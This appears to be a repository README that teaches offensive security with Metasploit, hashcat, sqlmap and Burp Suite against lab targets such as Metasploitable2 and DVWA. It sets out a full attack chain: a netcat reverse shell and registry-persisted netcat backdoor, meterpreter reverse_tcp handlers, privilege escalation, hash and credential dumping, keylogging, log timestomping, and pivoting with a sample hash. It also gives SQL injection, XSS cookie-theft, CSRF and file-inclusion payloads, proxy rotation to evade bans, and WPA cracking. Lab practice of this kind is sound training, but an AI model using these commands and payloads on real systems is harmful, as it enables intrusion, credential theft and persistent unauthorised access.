# Introduction

This readme is to run the basic set of offensive security tools inside different dockers and to familiarise the reader with it.

# Disclaimer

Running unauthorized attacks to public or private servers is illegal. The content of this repository is for educational purpose only. There are many websites that allow you to test and challege your newly acquireds skills, such as [HackTheBox](https://www.hackthebox.eu/) or [scanme](http://scanme.nmap.org/). Please use those or your private/simulated ones.

# How to install it

## Basic mode (a bit limited...)
You need to have Docker installed on your computer. Please go to the official Docker
[website](https://www.docker.com) and follow the installation steps described there.

__1. Pull the docker image__

Write the following command on you terminal to get the Docker image:
```bash
docker pull metasploitframework/metasploit-framework
```

__2. Run the docker__

To run the docker and to be able to use Metasploit, execute:
```bash
docker run -it --privileged metasploitframework/metasploit-framework
```

## Connect to database
Make sure you pulled the *msf* docker in the first place:
```bash
docker pull metasploitframework/metasploit-framework
```
You can store te found hosts and other information (e.g. their psws and username) onto a postgresql database. Pull the postgres docker image with:
```
docker pull postgres:13-alpine
```
Move to the folder where you want to store your exploit data. In my case  Then run:
```
docker run --ip 172.18.0.2 --network msf --rm --name postgres -v "${PWD}/database:/var/lib/postgresql/data" -e POSTGRES_PASSWORD=postgres -e POSTGRES_USER=postgres -e POSTGRES_DB=msf -d postgres:13-alpine
```
The **above starts the postgresql server and runs it in the background** (via `-d`): then you need to connect it to msf:
```
docker run --rm -it --network msf --name msf --ip 172.18.0.3 -e DATABASE_URL='postgres://postgres:postgres@172.18.0.2:5432/msf' -v "${PWD}/:/home/msf/.msf4" -p 8443-8500:8443-8500 metasploitframework/metasploit-framework
```
Check the connection status of *msf* to *postgre* with `db_status`.
The first time you need to save the database with `db_save` inside msf console:
```bash
db_save
>>> Successfully saved data service as default: 1LZNuXzS
```
The following time (make sure postgres docker runs) it will then be enough to run:
```
docker run --rm -it -u 0 --network msf --name msf --ip 172.18.0.3 -v "${PWD}:/home/msf/.msf4" -p 8443-8500:8443-8500 metasploitframework/metasploit-framework
```
Use the `workspace` command to visualize workspaces and the option `-a WP_NAME` to add one and `workspace WP_NAME` to change one. Option `-h` to get the commands.

## Accessing files on the local machine

The volume is at `cd /home/msf/.msf4` : hence, you can simply add the files in the metasploit folder on your local machine and access them via the path above.

## Vulnerable simulated machine

### Metasploitable2
This is a linux docker that is vulnerable. There are flags to collect :-)
Got to the `metasploitable` folder and run
```
#build image
docker build -t metasploitable2 .

#run container, -P publishes all exposed ports to ephemeral range
docker run -it -P --network msf --name ms2 --ip 172.18.0.5 metasploitable2
```
If required, use this to login: `msfadmin:msfadmin`

# Searchsploit
Searchsploit is a database of exploits, constantly updated. You can use it to install a local version with also the scripts to run the exploits. It is extremely powerful when used together with `use post/linux/gather/enum_protections` or `use post/multi/gather/enum_software_versions`.
On MacOS you can install the exploit database via
```
brew update && brew install exploitdb
```
On linux:
```
sudo apt update && sudo apt -y install exploitdb
```
## Basic usage
To get the list fo commands type
```
searchsploit -h
```
You can look for terms like
```
searchsploit privilege
```
You can also copy into the PWD the scripts such as
```
searchsploit -m 8572.c 8572.c
```
Use these scripts by uploading them to the host, compiling them and running them.

# Metasploit tutorial

Check out [this tutorial](https://www.offensive-security.com/metasploit-unleashed/) on how to use metasploit framework.

## Basic commands

 - `use module/name` to activate the module context
 - `back` to go back to the base context
 - `help` to get the list of commands
 - `-h` on a command to get help (e.g. `jobs -h`)
 - `run` to run exploits. To run as jobs (in background) use `-j`.
 - `setg` to set global variables
 - `hosts` lists of attacked hosts (require db)
 - `creds` lists of hashdumped credentials (require db)
 - `jobs` lists all the running jobs and by adding the id you can check it
 - `sessions` lists all the background sessions (e.g. meterpreter sessions)
 - `info` on a module to get the docs.
 
 ## Basic exploit modules
 
 ### Active
The modules activly attack a host

 - `use exploit/windows/smb/psexec` when you got the IP of the host, the user and psw
 
 ### Passive
 These modules wait for hosts to connect (usually exploit in the web)
 
  - `use exploit/windows/browser/ani_loadimage_chunksize` this waits for a victim to go on our website and exploit the animated cursor vulnerability

## Payloads
Payloads are exploit modules that you will inject into the victim. It is like the content of the exploit.

 - `show payload` to list the payloads
 - `set payload name_of_payload` to setup the payload
 - `show options` to check what is needed and set the parameters with `set PARAM VALUE`
 - finally type `exploit` to run the exploit
 
 Payloads can also be compiled into files of different formats with the command `generate`.
 
## Meterpreter (this is the most famous payload)
The Meterpreter is like a console that resides completely in the memory of the remote host and leaves no traces on the hard drive. You need to set up the local host `LHOST` to tell Meterpreter where to send the console: use `ifconfig` to know your ip. It performs in-memory DLL injection.

You need to run the `exploit` command to run the exploit and deliver the payload. Then you will actually get the meterpreter context.

One useful command is `generate` as it creates an **executable shell code.** Type `shell` to get access to the victim's shell.

 - You can impersonate users by first listing the tokens `list_tokens` and then `impersonate_token DELEGATION_TOKEN`.
 - `background` command is to make the session run in the background. To get the session back: `sessions -l` to list them and then `sessions -i ID`
 - `run post/linux/gather/hashdump` to dump all the psw hashes (on linux check `/etc/shadow`).
 - `migrate` s useful to migrate to another process (list processes with `ps`)
 - `shell` to open a shell session. To put such **shell session in background**, use `Ctrl + z`
 - (pro version) `load` allows you to load meterpreter modules to get credentials or others (e.g. `kiwi`). For example:
 ```
load incognito
list_tokens -u
hashdump
```

# Other free tools used below
There are may other tools with specific functionalities. A very short list of those I tried:
 - [BirDuster](https://github.com/ytisf/BirDuster)
 - [Responder](https://github.com/lgandx/Responder)
 - [Hashcat](https://hashcat.net/hashcat/)
 - [BurpSuite](https://portswigger.net/burp)
 - [SecLists](https://github.com/danielmiessler/SecLists)

# Steps of an attack

## Information gathering
 - The passive appraoch is to go on websites like [this one](https://hunter.io) and look for companies information. You can also look on google and even look for *1.4 billion clear passwords* on Google and find the Github where this database is conntained. You can find many lists of different kind of useful words at [SecLists](https://github.com/danielmiessler/SecLists): these lists are useful for all kind of bruteforce attacks. Can also use `theharvester` on kali-linux.
 - To bruteforce directories and files on a webserver, try [BirDuster](https://github.com/ytisf/BirDuster). You can `git clone https://github.com/ytisf/BirDuster.git` and run it via `python BirDuster.py -l dir_list.txt -p 88 localhost`. Use `python BirDuster.py -h` to get the help.
 - Port Scanning:  
     - The king here is **nmap**. `nmap -O -v -sV -A -Pn 192.168.1.0/24` i.e. Network Mapping to scan for open ports. Use option `-A` to get the ouput of all scripts of Nmap. `-Pn` is to treat all hosts an online. You can run attacks on my application if you want to practice: this is the [link](scanme.nmap.com). The list of `nmap` scripts can be found here: `/usr/share/nmap/scripts/`: they can be run the target port to check for vulnerabilities or to *enumerate*: for example, you can enumerate the ciphers used via `--script=ssl-enum-ciphers.nse -p 443 host_IP`. When running nmap, do it in a staged way: start with `nmap -T4 -p- host_name` to scan all ports. Then, only on the open ports, use the `-A` flag.
     - you can `load nexpose` : to run it you need to have an active nexpose server and `nexpose_connect` to it. Check commands with `-h`.
     - `use auxiliary/scanner/portscan/syn` . Then `show options` and fill in the missing parameters
     - `use auxiliary/scanner/smb/smb_version` to check what system they are running
     - For others modules, search for the keyword `search portscan`
 - Hunting for MSSQL:
     - `search mssql`. One of the apps is `use auxiliary/scanner/mssql/mssql_ping`. Once activated, then run a search over the hosts `set RHOSTS 192.168.1.0-10` and `exploit` to run
 - Service Identification:
     - scan for `ssh`, e.g. `use auxiliary/scanner/ssh/ssh_version`
     - scan for `ftp` exploits, e.g. `use auxiliary/scanner/ftp/ftp_version`
 - Password Sniffing:
     - `use auxiliary/sniffer/psnuffle` and it does not even require parameters! It just statistically understands the password by listening to the network traffic.
 - SNMP (Simple Network Management Protocol) sweeping:
     - To check for routers and sniff their messages: e.g. `use auxiliary/scanner/snmp/snmp_login` and set up the hosts to sweep: `set RHOSTS 192.168.0.1-192.168.5.100` and to parallelise `set THREADS 10`
     - Windows patches enumeration, as there are known exploits: `use post/windows/gather/enum_patches`
     
## Vulnerability scanning
 - SMB login: when you have a pair usr:psw, you may look for where this pair works elsewhere. Run `use auxiliary/scanner/smb/smb_login` 
 - Running VNC servers without psw: `use auxiliary/scanner/vnc/vnc_none_auth`
 - Web scanner: 
     - **load the WMap plugin** with `load wmap` -- require connected db. Check [here](https://www.offensive-security.com/metasploit-unleashed/wmap-web-scanner/)
         In brief you can add a site to the WMap list (`wmap_sites -a URL`) and moving that site to the targets by id in `wmap_sites -l` (`wmap_targets -d 0`). Then you can run the scan with `wmap_run -t` and check the vunerabilities with `vulns`.
     - **load the NeXspose plugin** with `load nexpose` -- Require a NeXpose server to run. For details, check [here](https://www.offensive-security.com/metasploit-unleashed/nexpose-msfconsole/). For example, run `services` and `vulns` once loaded
     - **load the Nessus plugin** with `load nessus` -- rerquires Nessus server to run in the background. Check [here](https://www.offensive-security.com/metasploit-unleashed/nessus-via-msfconsole/).
     - **Fuzzers** are program to test the input of applications for overflow bugs. Can write your own that checks FTPs andd IMAPs.
     
## Gain access

### SSH password cracking -- bruteforce
The idea is to try out a database of usr:psw and see if one of them works. So, we first need to create a file with those parirs, one per line, separated by a space.
Once the **ssh host** has been identified, we need to run the `auxiliary/scanner/ssh/ssh_login` and set the `USERPASS_FILE` to ours. Then check the open `sessions -i`.

### Client-side exploits
This technique consists in creating executables and tricking the victim to get and execute them. The main tool is `msfvenom`. You can `search` for it. Check [here](https://www.offensive-security.com/metasploit-unleashed/binary-payloads/).

### LLMNR, NBT-NS and mDNS

**Responder** is a LLMNR, NBT-NS and MDNS poisoner.
You can get it with `git clone https://github.com/lgandx/Responder.git` and you can run it via
```
python Responder.py -h
sudo python Responder.py -i 127.0.0.1 -I eth0 -rPv
```

## Take control

### Meterpreter session
In general, once a vulnerability has been identified, it can be exploited. The payload can be a meterpreter session activation.
For wndows, you can use 
```
set payload windows/meterpreter/reverse_tcp   
```
For unix use:
```
set payload cmd/unix/reverse
```
In the pro version, there are also many plugins that you can load (e.g. `load kiwi`).
If you managed to open up a **shell session**, for example using `use exploit/unix/misc/distcc_exec` on Metasploitable2, then execute `sessions -u ID` to **upgrade to the meterpreter.**

### Suggestion for post-exploits
Once you have a meterpreter, use `use post/multi/recon/local_exploit_suggester` and set the meterpreter session. Then run and wait for the analysis.
The results will tell you which are plausible exploits for priviledges escalation for example.

### Priviledge escalation
You can run escalation exploits on already existing meterpreter sessions with low access priviledges. Check with the `local_exploit_suggester` suggester what is the right exploit. For example:
```
use exploit/linux/local/glibc_ld_audit_dso_load_priv_esc
set payload linux/x86/meterpreter/reverse_tcp
set session 2
run
```
At this point you shall receive `root` access and you wreak havoc.
Another technique for priviledge escalation consists in using the low level account to upload files to the victim machine and run these files. Some of these files may need to be compiled (if written in c for example). Once these files are injected, they usually open a port: prepare your `exploit/multi/handler` on metasploit to receive the connection.

### DoS
Check with **nmap** the vulnerabilities to DoS attacking tools. 
For example, `use auxiliary/dos/http/slowloris` and set the RHOST to the victim. *Use Nmap to scan for DoS vulnerabilities.*

## MSF post exploitation

 - Clear the logs (`use priv` once meterpreter is running and then `timestomp` on the logs)
 - Enumerate the system protections: `use post/linux/gather/enum_protections`
 - Enumerate the software versions to then search for them in the `searchsploit`: `use post/multi/gather/enum_software_versions`
 - You can install a keylogger once the meterpreter session is on: `use post/windows/capture/keylog_recorder` .
 - Install a `Netcat` backdoor: use meterpreter to upload netcat to the victim `upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32` and then set the *registry* to run Netcat at every starp-ups: 
     - `reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run`
     - `reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d 'C:\windows\system32\nc.exe -Ldp 445 -e cmd.exe'`
     - `reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v nc` (set the backdoor at port 445)
     - After rebooting the victim system run this on the msf console: `nc -v VICTIM_IP 445`
 - Can even run a remote desktop with `post/windows/manage/enable_rdp`
 - **Packet sniffing**: first get the meterpreter console, e.g. `use exploit/windows/smb/ms08_067_netapi`. Then,  `set PAYLOAD windows/meterpeter/reverse_tcp`. Recall: `LHOST` is the local (attacker) host, while `RHOST` is the remote (victim) host. Once run, the meterpreter session will start. Then `use sniffer` when you are on the meterpreter and:
     - Get the interface `sniffer_interfaces`
     - Get the packets o one interface and dump them at */tmp/all.cap* via `sniffer_start 2` and `sniffer_dump 2 /tmp/all.cap` 
     - Stop the sniffer `sniffer_stop 2` and release it `sniffer_release 2`
 - Pivoting. First prepare a **reverse_tcp** (i.e. prepare a malicious server so that when someone connects to it, the firewall will allow the connection.):
     - `use exploit/windows/browser/ms10_002_aurora`
     - `set URIPATH /`
     - `set PAYLOAD windows/meterpreter/reverse_tcp` this step requires a LHOST to be set
     - `set LHOST 192.168.1.101` (this is the *local server* where we receive the shell!)
     - `exploit -j` (the exploit run in background). once the victims connects, we get full access
         - check the sessions: `sessions -l`
         - decide with which interact directly, e.g. `sessions -i 1`. At this moment the meterpreter is launched
         - check the local ip with `ipconfig`
         - do the **pivoting** by exploiting the connected IPs found with ipconfig. Run the command `info post/multi/manage/autoroute` to get the help list. 
             - In the meterpreter `run post/multi/manage/autoroute` for the CCIDR notation (24 is the number of bytes in the subnet mask that you are scanning)
             - Then get the whole system `run post/windows/escalate/getsystem`
             - ... and dump the passwords `run post/windows/gather/smart_hashdump`
        - Enumerate other networks -- within the mterpreter session -- with e.g. `run post/linux/gather/enum_network` (if the system is linux).
        - You can check the `arp -a` routing tables to see if there are other netwroks connected and ready to be exploited! Similarly for `netstat -ano`.
        - check if there are other systems `use auxiliary/scanner/portscan/tcp`
            - set the newly found IPs `set RHOSTS 10.1.13.0/24` and ports `set PORTS 139,445`
            - Once we find the new open ports, let's try our stored password to gain access to this new system: `use exploit/windows/smb/psexec` and set `set SMBUser Administrator` and `set SMBPass 81cbcea8a9af93bbaad3b435b51404ee:561cbdae13ed5abd30aa94ddeb3cf52d` and finally bind the new tcp `set PAYLOAD windows/meterpreter/bind_tcp`; execute `exploit`. If everything goes well, we get the meterpreter console
     - check also `portfwd` command on meterpreter [here](https://www.offensive-security.com/metasploit-unleashed/portfwd/). This command creates a tunnel from the local ports to the remote ports: `portfwd add –l 3389 –p 3389 –r  target_IP`.
 - To capture screenshots, use `use post/windows/manage/webcam`, add the the meterpreter session and then `screengrab` once you are in the meterpreter.
 - To dump all the avalable credentials (pro version) use `load kiwi` and then `creds_all`.
 - Table password hacking: when you loot the hash of passwords (*use post/linux/gather/hashdump on an open session*), you can use **John The Ripper** with `use auxiliary/analyze/crack_aix` then `run`. In the docker version, you do not have *jtr*: see below for **hashcat**. An home-made version of an hash cracker is `hashcracker` (check the folder `/hashcracker/source/`) and run from the root folder  `python source/hashcracker.py SHA256 11a1162b984fef626ecc27c659a8b0eead5248ca867a6a87bea72f8a8706109d -mode bruteforce -range 6 11 -chars abcdefghijklmnopqrstuvwxyz0123456789$#@` or something like `python source/hashcracker.py MD5 list_of_hashes.txt -mode list -pwlist passwordlist.txt -hashlist ` or even `python source/hashcracker.py SHA256 11a1162b984fef626ecc27c659a8b0eead5248ca867a6a87bea72f8a8706109d -mode list -pwlist ../lists/realhuman_phill.txt`. For more powerful tools, check the next subsection.
 
### Cracking hashes with hashcat
Table password hacking with **hashcat**: currently the most powerful free tool. Download the docker with `docker pull dizcza/docker-hashcat:intel-cpu` and, from the root of this repo, folder run it via `docker run -v "${PWD}/:/root/lists/" -it dizcza/docker-hashcat:intel-cpu /bin/bash`. Once inside the docker, you can run `hashcat -b` to check if it works. Then, refer to the official [website](https://hashcat.net/wiki/doku.php?id=hashcat) for more information. A real test with `hashcat -m 500 -o lists/lists/cracked_hash.pwd lists/lists/stolen_hash.pwd lists/lists/psw_common.pwd`.
To see the previously hacked hashes, you can use the `--show` switch. for example, if you have just cracked the file `lists/100.hccapx`, you can type:
```
hashcat -m 2500 --show lists/100.hccapx
```

## Maintaining access

 - Add a new **ssh** account to login with it anytime: `use post/linux/manage/sshkey_persistence`.
 - **Install backdoor on linux**. We assume you already have a meterpreter session open. The fist step is to prepare a listener on the localhost:
     - First `use exploit/multi/handler` and set the set the `set PAYLOAD payload/php/meterpreter/reverse_tcp` and run with `exploit -j` to run in the background. For the moment we are only listening.
     - We now have to prepare the executable version of the same payload: `use payload/php/meterpreter/reverse_tcp` and generate it as a file: `generate -f raw -o reverse_tcp.php`. **Pay attention to the initial comments in the file**: if you want to execute the file with meterpreter created shell via `php file_name.php`, you have to remove the initial `/*`  `/**/`comments from the file.
     - Upload this file to the victim with meterpreter: `upload LOCAL_SCRIPT REMOTE_LOCATION`.
     - (Not needed for *php*, useful for *bash*) Change to executable and execute the script via: `chmod 777 REMOTE_FILE` then  `execute -f REMOTE_FILE`.
     - Then execute the php file from the shell: `shell` then `php file_name.php`.
     - The `multi/haldler` shall now have received the connection.
 - **Netcat backdoor**. To install a Netact backdoor, the server has to run netcat or we have to upload the netcat.exe file to the server. This backdoor is easy to set up:
     - On the attacker's host run `nc -lvp 12345` to listen for connections at port `12345`.
     - Whatever the way, sneak into the victim the following code `nc ATTACK_IP 12345 -e /bin/bash`.
     - This technique can be used to open up a shall if it was not already open before (for example if the code is injected by other means, e.g. web interface)
     - You can also use exploit to escalate priviledges, for example using the netlink/udev vulnerability. In this case:
         - Open a meterpreter with low priviledges
         - `upload` a `run` file as the one in the `venom` folder and the `8572.c` file (check the `searchsploit`) to `/tmp`.
         - From the low-priiledged meterpreter, compile the c file `gcc -o exploit 8572.c` and execute it via `./exploit NETLIK_IP`.
         - Find the Netlink IP in the `/proc/net/netlink` file.
 - **Persistent backdoors for Windows**: `run post/windows/manage/persistence_exe -h` on the meterpreter and set `run post/windows/manage/persistence_exe -U -i 5 -p 443 -r 192.168.1.71`. Now the persistent backdoor is installed. To reboot the system and check the persistence use `reboot` in the meterpreter and `exit`. Then, to manage the backdoor connections installed to the victim, we can use the generic module `handler`.
     - `use exploit/multi/handler`.
     - `set PAYLOAD windows/meterpreter/reverse_tcp` this payload will inject the shell.
     - `set LHOST 192.168.1.71` this is the hacker computer, to receive the shell.
     - `set LPORT 443` this is the attacker's port to listen to.
     - `exploit` this commands sends the exploit.
     - `sysinfo` to check the newly opened meterpreter session.

# Appendix: A Damn Vulnerable Web App
## Install the DVWA
You can have fun with webapp attacks using DVWA docker.
```
docker pull vulnerables/web-dvwa
```
And then run it on port 80:
```
docker run --rm -it --ip 172.18.0.7 --network msf -p 88:80 vulnerables/web-dvwa
```
Just click on the Create / Reset database button and it will generate any aditional configuration needed.

Access the app with admin:password at:
```
http://localhost:88/login.php
```
If you want to attack the app with metasploit, then `setg RHOST 172.17.0.3`.

## Install Burp Suite Free
You can download the latest version [here](https://portswigger.net/burp/communitydownload). 

### Introduction
Burp suite is a proxy. You will make all your traffic from and to your computer pass through burp.
Being a proxy you can send forged requests, do bruteforcing attacks and even some statistical analysis of tokens.

### Proxy
This section is where you can itnercept all the traffic. **Intercept is off** is the command to switch on to start intercepting.
**Forward** s to make the request go though (the browser). You can also modify it and send it modified.
Once you have an interesting request, you can rightclick and send that request to the other tools for  further analysis: see below.

### Intruder
In the intruder you do brute force attacks. You can select the pieces of the request to change (using §) into the right table, and choose the payload for each ddatum (it also depends on the attack type, e.g. *Sniper* tries everything at every spot).

### Repeater
It allows to store a request and send it many times over with (manual) modifications.

### Sequencer
This tool is specific to make statistical analysis of cookies or tokens. Send the piece of request that contains such token to the sequencer from the proxy, identify what the token is and allow the Sequencer to do send the request for tokens over and over.

## Command injection

On DVWA inject
```
127.0.0.1 |cat /etc/passwd
```

## SQL Injection
Input the following line in the user ID field:
```
%' and 1=0 union select null, concat(user,':',password) from users #
```
To optimise and reach the above query state, you can use Burp Suite and send the SQL request to the **repeater** and optimise the text. You can use the **decoder** option to convert the text above into the MySQL format automatically (and then copy-paste it.

## SQL Injection (Blind) -- requires `sqlmap`
These ijection are about injecting SQL code without executing the query at the same time. Thus, the results will not be displayed on the screen as a HTTP response.
You need on the one hand the Burp Suite and on the other hand **sqlmap**.
Get the git of sqlmap (in python) 
```
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
```
and run it -- from the root folder -- via
```
python sqlmap.py -hh
```
At this point, use burp to **intercept** the request to get the URL for **sqlmap**
```
python sqlmap.py -u "http://localhost:88/vulnerabilities/sqli_blind/?id=1" --cookie="PHPSESSID=p80ale70geam5uu49728t2r2u6; security=low" --batch --tables
```
To find the existing databases use `--dbs`. Once you find the database, select it via `-D` and then find the `--tables`. Select a table with `-T` and to display the columns use `--columns`. Once you know the columns, chose them with `-C` and `--dump` the information. You will be asked to attempt a dictionary attack to crack the hashes: you can say yes and have a try.
Then check the `--password` option as well.
The list of commands to crack the DVWA blind SQL injection challenge:
```
python sqlmap.py -u "http://localhost:88/vulnerabilities/sqli_blind/?id=1" --cookie="PHPSESSID=p80ale70geam5uu49728t2r2u6; security=low" --dbs

...curity=low" -D "dvwa" --tables

...curity=low" -T "users" --columns

...curity=low" -C "password" --dump
```

## XSS DOM (queryparams)
On the URL line type
```
http://localhost:88/vulnerabilities/xss_d/?default=English#<script>alert(document.cookie)</script>
```

## XSS Reflected
Type
```
<body onload=alert(document.cookie)>
```
## XSS Stored

Only the name box is vulnerable: change the html paramter with **inspect** and modify `maxlength` to enlarge the name input size! And then
```
<img src=sd onerror="alert(document.cookie)">
```

## CSRF
Copy the form, hide all the input buttons, make the URL action match the dvwa one and "deploy" the new website to trick customers to click on the submit button. If they are logged into the app, the password will be changed without them knowing!
This is the example html: the *low level* can be solved with this.
```
<form action="http://localhost:88/vulnerabilities/csrf/?" method="GET">
            <h1>Click on this button to win 1000$</h1>
            <input type="hidden" autocomplete="off" name="password_new" value="hack">
            <input type="hidden" autocomplete="off" name="password_conf" value="hack">
            <input type="submit" value="Win!" name="Change">
        </form>
```
*At higher security levels*, you need to exploit the other DVWA XSS vulnerablities to acquire a valid session token, otherwise the POST will not work. Prepare a javascript that fetches the token from the crsf page of dvwa and then send the forged request (check *venom/csrf.html*). The script must be executed by the user on the dvwa: for example, use the **XSS (Stored)** vulnerablity to inject a hyperlink to the script and wait for the user to click on it:

 1. Move to the folder where your **csrf.html** with your terminal
 2. Upload the file (e.g. in low security) to the dvwa: `hackable/uploads/csrf.html`
 3. The html is now ready and you can inject it as in **XSS (Stored)**:
```
<a href="http://localhost:88/hackable/uploads/csrf.html">Click Me!</a>
```
### Observation: 
You could have tried to serve the file, e.g. go with terminal to the folder of the file and then run `python -m http.server`. Your **crsf.html** file will be at `http://localhost:8000/csrf.html`. Unfortunately, **CORS** of modern browser will prevent this approach (also in *low* leve!)

## Javascript
In the **console**, you can run javascript functions.
1. Type `success` without *enter*
2. In the console, type `generate_token()`
3. click on `Submit`
In difficulty high, you will need to **deobfuscate** the code first. Use [this](http://deobfuscatejavascript.com/) website to past the code of `high.js`. The important functions are at the end:
```
function do_something(e) {
    for (var t = "", n = e.length - 1; n >= 0; n--) t += e[n];
    return t
}
function token_part_3(t, y = "ZZ") {
    document.getElementById("token").value = sha256(document.getElementById("token").value + y)
}
function token_part_2(e = "YY") {
    document.getElementById("token").value = sha256(e + document.getElementById("token").value)
}
function token_part_1(a, b) {
    document.getElementById("token").value = do_something(document.getElementById("phrase").value)
}
document.getElementById("phrase").value = "";
setTimeout(function() {
    token_part_2("XX")
}, 300);
document.getElementById("send").addEventListener("click", token_part_3);
token_part_1("ABCD", 44);
```
Follow the functions calls: when the script loads, it applies `token_part_1("ABCD", 44)`; after 300ms `token_part_2("XX")` is executed. When you click **Submit** you execute, with *defaults*, `token_part_3(null,"ZZ")`. Hence, you have to apply, in the console, the following code:
```
token_part_1("ABCD", 44);
token_part_2("XX")
token_part_3(null,"ZZ")
```
The token value you see in the *form* element is now the coorect one. Copy it.
Then you shall intercept with the Burp Suite the submit, paste your token in the request before it is sent, and then click "forward" to send the request.

## Weak session IDs

Intercept the GET request and send it to the **sequencer** of the Burp Suite to perform a statistical attack. The Burp Suite will analyse the **dvwaSession** cookie and check its statical randomness. If it is poor, we can actually build a statistical attack to identify such session tokens.

## CSP Bypass

Chech the `hraderCSP` and discover that `https://pastebin.com` is whitelisted or that you have a `nonce` parameter set up for your styles and scripts.
Use pastebin as written in a comment in the code:
```
https://pastebin.com/raw/R570EE00
```
or
```
<script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=">document.cookie</script>
``` 
Probably still not working due to modern **CORS** checks.
Other tries:
```
<style>h1:after{content:"blablabla";}</style>
```

## Brute Force
You can use to Burp Suite to run the Brute Force attack. You can use the Burp Suite list or your custom list and past it into the **Intruder**. Select where the paramters to be changed are located, choose the attack type, upload the list in the Payload and run the attack!

## File inclusion
On the URL line type
```
http://localhost:88/vulnerabilities/fi/?page=../../../../../../etc/passwd
```
Or maybe (for higher level of security)
```
http://localhost:88/vulnerabilities/fi/?page=file:///etc/passwd
```
## File upload
You can build a php script and activate it by navigating to it. You can also mask it by changing the first line and the extension. To build the raw file, check the section on "maintaining access" (the basic command sequence is first to `use PAYLOAD payload/php/meterpreter/reverse_tcp` and then `generate` it ).
Then move to the URL of the file as specified in the output to activate it!
On **metasploit**:
```
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set lhost 172.18.0.3
set lport 8444
run
```

# Appendix B: rotate proxies

Rotating proxies to avoid your IP to be banned during Brute Force attacks is a nice techniques.
In order to do so, you hav to redirect your traffic through different proxies every time.
In **python** you can simply do the following steps:

1. Recall that the `requests` module allow for setting the proxy like `requests.get('http://example.org', proxies=proxies)`.
2. Scrape the website  `https://free-proxy-list.net` automatically to find free proxies.
3. Loop over the proxies when sending requests.

Check out the python script in the folder `venom/rotateIP.py`.

### Observations:
1. In `python` you can host a server (a folder!) viao `python -m http.server`
2. In `python` you can host an ftp server with `pyftpdlib` and run it with `python -m pyftpdlib -p 21 w`

# Appendix C: port-scanner with python
Use sockets. Try to connect to a port and see if -- wthin a few seconds -- the socket connection results are erros or not.
The core of the code could be something like this:
```
import socket
target = socket.gethostbyname("giotto.ai")
for port in range(50,80):
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.settimeout(1)
    result = s.connect_ex((target,port))
    if result == 0:
        print("We have found an open port: " + str(port))
    s.close()
```
Check the script in `venom/`.

# Appendix D: a low level python proxy
In the script in `/venom/simpleProxy.py` we find the low level code for a simple proxy. A proxy is a server put in the middle between the remote servers and your loccal host. Thus, all the packets flow through it... and can be tampered. *BurpSuite* works precisely on this principle.
All the requests from the browser to the server and the responses are intercepted by this proxy and -- if you want -- can be tampered.

The expected use to run the Proxy is `python simpleProxy.py int_LPORT int_INTERCEPT`

Then, assuming `int_LPORT=80`, go to your browser and type:
[http://localhost:80/https://www.google.com](http://localhost:80/https://www.google.com)

When you navigate you will see all the traffic going through the proxy.


# Appendix E: the basics of packet sniffing
The basic of the sniffer is the *raw socket*. These sockets read data directly from the Ethernet layer of your connection, without using TCP/UDP. Since they do not use the transport layer, PORT and IP address are not needed. Normal sockets, on the other hand, work on top of thhe transport layer.
In python, this is the key line of code to set up a raw socket:
```
# create an INET, raw socket
s = socket.socket(socket.AF_INET, socket.SOCK_RAW)

# read data from the cable
data, addr = s.recvfrom(65536)
```
You have to be the root user to run the script, so:
```
sudo python networkSniffer.py
```

Check the script in `venom/networkSniffer.py` for some basic working code. Have a look [here](https://www.opensourceforu.com/2015/03/a-guide-to-using-raw-sockets/) for more information.

# Appendix F: web scraping
There is a simple tool to roam the internet in python: [Selenium](https://selenium-python.readthedocs.io). After initialising a web driver on a specific browser, you can program the actions of the driver by selectng elements and actions (e.g. `click()` or `send_keys()`). Have a look at `/venom/Scraping.py` for a basic example.

# Appendix G: WiFi analysis and password cracking

The tool we are goinf to use for this appendix is **airport** and it already comes with macOS. There are other tools of interest that you may check out:
 - [aircrack-ng](https://www.aircrack-ng.org) installable with `brew install aircrack-ng`.
 - [Wireshark](https://www.wireshark.org) to snff raw packets from the cable

## Run wifi scans with airport
We are going to use airport and use the Wifi card in monitor mode. Your Wifi will be disconnected when you attempt these experiments. To get the list of nearby Wifi's simply type:
```
sudo /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s
```
Save the CHANNEL of the netwrok you are interested in attacking, then dissocate airport with `-z` flag. 
You may also set the channel with `-cCHANNEL` (otherwise, add it to the `sniff` command -- see below)

## Sniff traffic on the wifi using airport:
You need to use the `airport` tool to use the Wifi board as a signal receiver. The channel is the one we found before.
```
sudo /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport sniff CHANNEL
```
The `airportSniffXXX.cap` file will be stored automatically in `/tmp/`.

## Convert to hccapx with **hashcat**
Use the functionalities of hashcat to convert the `.cap` file to the 
```
cap2hccapx capture.cap capture.hccapx
``` 
In order to obtain meaningful results, you have to capture the 4-steps *handshake*.
Then, it is enough to use hashcat to crack the WPA with a list of words:
```
hashcat -m 2500 lists/11.hccapx lists/lists/psw_common.pwd
```
For a bruteforce attack, try:
```
hashcat -m 2500 -a3 lists/11.hccapx "?l?l?l?l?h?h?d?d"
```
To better understand the concept of **mask**, please have a look [here](https://hashcat.net/wiki/doku.php?id=mask_attack)

## Decrypt traffic (requires Wireshark)

Traffic is usually encrypted in modern WPA and WEP wifi connectons.
If you are able to crack the password of the wifi, you will also be able to decrypt the messages and requests.
Then:
 1. In the Wireshark preferences, look for protocols, then IEEE 802.11 and add the password:
   a. **wpa-psw** format: my_password:SSID . SSID is usually the Wifi name
   b. **wpa-psk** convert the password and SSID to PSK [here](https://www.wireshark.org/tools/wpa-psk.html)
 2. Make sure that you capture the 4 handshakes, or the decryption will not take place. Look for handshake in the Wireshark filters by searching for the **eapol** protocol.

The decryption should be automatic (otherwise save the packets and restart Wireshark). You can now look for **data** in the filters and check the content in clear. You can also look for **tcp** protocol and check both the source and destination IP.
To learn the details of how to read the content of Wireshark packets, you can ahve a look at [Wikiversity](https://en.wikiversity.org/wiki/Wireshark).
